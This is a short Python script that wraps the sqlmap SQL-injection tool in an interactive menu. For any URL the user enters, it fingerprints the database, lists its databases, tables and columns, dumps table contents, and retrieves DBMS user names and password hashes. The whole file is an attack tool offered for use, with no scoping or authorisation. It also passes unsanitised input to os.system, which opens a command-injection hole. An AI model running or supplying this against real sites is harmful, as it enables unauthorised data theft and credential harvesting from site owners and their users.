import os
import sqlmap


options = [
	'1. Get backend DBMS details',
	'2. Get Databases',
	'3. Get tables for specific database',
	'4. Dump table of database',
	'5. Get columns of a table in a database',
	'6. Get users of DBMS',
	'7. Get password of DBMS users',
	'8. Exit'
]

while(True):
	print('||||||||| SQLMAP |||||||||!\n\nSelect your option:')
	for option in options: print(option)
	option = int(input())
	if option == 1:
		print('enter the URL:')
		URL = input()
		op = os.system('sqlmap.py -u "{0}"'.format(URL))
	elif option == 2:
		print('enter the URL:')
		URL = input()
		op = os.system('sqlmap.py -u "{0}" --dbs'.format(URL))
	elif option == 3:
		print('enter the URL:')
		URL = input()
		print('enter the name of the database:')
		db = input()
		op = os.system('sqlmap.py -u "{0}" --tables -D {1}'.format(URL, db))
	elif option == 4:
		print('enter the URL:')
		URL = input()
		print('enter the name of the database:')
		db = input()
		print('enter the name of the table:')
		tbl = input()
		op = os.system('sqlmap.py -u "{0}" --dump -D {1} -T {2}'.format(URL, db, tbl))
	elif option == 5:
		print('enter the URL:')
		URL = input()
		print('enter the name of the database:')
		db = input()
		print('enter the name of the table:')
		tbl = input()
		op = os.system('sqlmap.py -u "{0}" --columns -D {1} -T {2}'.format(URL, db, tbl))
	elif option == 6:
		print('enter the URL:')
		URL = input()
		op = os.system('sqlmap.py -u "{0}" --users'.format(URL))
	elif option == 7:
		print('enter the URL:')
		URL = input()
		op = os.system('sqlmap.py -u "{0}" --passwords'.format(URL))
	elif option == 8:
		print('Bye')
		break
	else: 
		print('invalid option.\n')